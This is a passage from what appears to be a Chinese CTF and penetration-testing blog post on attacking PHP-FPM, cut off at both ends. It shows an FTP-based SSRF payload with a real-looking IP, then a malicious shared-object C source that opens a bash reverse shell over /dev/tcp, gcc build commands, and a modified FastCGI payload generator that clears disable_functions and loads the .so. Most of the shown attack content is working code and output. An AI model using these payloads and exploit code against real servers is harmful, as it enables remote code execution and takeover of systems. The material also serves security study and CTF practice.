第一次连接是下载文件，需要告诉客户端下载已经结束</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;226 \n&quot;</span>)<br>    conn.close()<br>    count += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>发送payload</p><p><code>?viewFile=ftp://47.99.77.52:5566/test</code></p><p>正常的输出应该如下，有第二次建立连接的过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;USER anonymous\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;TYPE I\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;SIZE /test\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;EPSV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;PASV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;RETR /test\r\n&#x27;</span><br>建立连接!<br>断开连接!<br>b<span class="hljs-string">&#x27;USER anonymous\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;TYPE I\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;SIZE /test\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;EPSV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;PASV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;STOR /test\r\n&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="攻击unix套接字模式下的php-fpm"><a href="#攻击unix套接字模式下的php-fpm" class="headerlink" title="攻击unix套接字模式下的php-fpm"></a>攻击unix套接字模式下的php-fpm</h1><p>以上的所有方法都是基于TCP通信方式进行攻击的。但是在php-fpm中还有一种unix domain socket通信方式，它是unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了</p><p>一般来说这种通信方式不能进行ssrf，因为没有经过网络协议层</p><h2 id="加载so绕过disable-functions"><a href="#加载so绕过disable-functions" class="headerlink" title="加载so绕过disable_functions"></a>加载so绕过disable_functions</h2><blockquote><p>两种通信方式都能使用此方法绕过</p></blockquote><p>在CTF或者渗透测试中经常会遇到目标环境设置了 disable_functions 的情况，但是 PHP_ADMIN_VALUE 不可以设置 disable_functions ，因为这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中</p><p>但是我们可以参考 LD_PRELOAD 绕过的方式，上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展</p><p>制作恶意so文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><p>以下是修改过的 <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a>，可以生成payload，注意修改 PHP_VALUE 的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># 修改点 1</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br><br>        <span class="hljs-comment"># 修改点 2</span><br>        <span class="hljs-comment"># try:</span><br>        <span class="hljs-comment">#     self.sock.connect((self.host, int(self.port)))</span><br>        <span class="hljs-comment"># except socket.error as msg:</span><br>        <span class="hljs-comment">#     self.sock.close()</span><br>        <span class="hljs-comment">#     self.sock = None</span><br>        <span class="hljs-comment">#     print(repr(msg))</span><br>        <span class="hljs-comment">#     return False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>              + bchr(fcgi_type) \<br>              + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(self.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(self.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-comment"># 修改点 3</span><br>        <span class="hljs-comment"># self.sock.send(request)</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span><br>        <span class="hljs-comment"># return self.__waitForResponse(requestId)</span><br>        <span class="hljs-keyword">return</span> request<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = self.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hack.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    <span 